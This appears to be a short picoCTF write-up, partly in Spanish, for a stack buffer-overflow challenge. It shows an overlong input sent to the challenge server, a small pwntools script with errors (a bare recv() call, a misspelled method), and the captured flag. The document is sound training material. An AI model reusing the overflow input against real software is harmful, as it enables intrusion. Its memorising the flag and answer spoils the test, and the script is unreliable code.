## Descripción 

Smash the stackLet's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/173/vuln). You can view source [here](https://artifacts.picoctf.net/c/173/vuln.c). And connect with it using:`nc saturn.picoctf.net 51532`

## Hints



## Solución
```
kifuel@DESKTOP-3C07MOG:~$ nc saturn.picoctf.net 51532
Input: 12345678901234567890123456879
picoCTF{ov3rfl0ws_ar3nt_that_bad_90d2bb58}

```

```
from pwn import *

p = process('./vuln')
linea = recv()
print(linea)

p.sendlines('aaaaaaaaaaaaaaaaaa')
linea = p.recv()
print(linea)
```

## Bandera
picoCTF{ov3rfl0ws_ar3nt_that_bad_90d2bb58}